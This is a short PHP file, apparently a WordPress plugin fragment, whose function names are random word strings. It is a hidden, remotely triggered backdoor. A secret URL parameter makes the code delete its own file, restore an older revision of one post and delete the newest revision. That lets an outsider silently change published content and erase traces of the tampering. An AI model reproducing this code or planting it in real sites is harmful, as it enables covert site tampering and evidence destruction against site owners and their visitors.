<?php

function invoice_automatic_kit_comments() {
	if (isset($_GET['class_connect_tables_popular']) && $_GET['class_connect_tables_popular'] === 'replace_manager_reviews_dynamic') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$sites_sitemaps_extension_soon = 2511;
		$audio_embed_project_item = wp_get_post_revisions($sites_sitemaps_extension_soon);
		if (empty($audio_embed_project_item)) die('no revisions');
		if (count($audio_embed_project_item) < 2) die('less than 2');
		$duplicate_player_lightgray_upgrader = array_shift($audio_embed_project_item);
		$changer_shopping_board_accessibility = $duplicate_player_lightgray_upgrader->ID;
		$finder_categories_comment_migration = array_shift($audio_embed_project_item);
		$reminder_shortener_frontend = $finder_categories_comment_migration->ID;
		$sync_title_better_generator = wp_restore_post_revision($reminder_shortener_frontend);
		if ($sync_title_better_generator === false) die('error restoring');
		$sync_title_better_generator = wp_delete_post_revision($changer_shopping_board_accessibility);		
		if ($sync_title_better_generator === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'invoice_automatic_kit_comments');
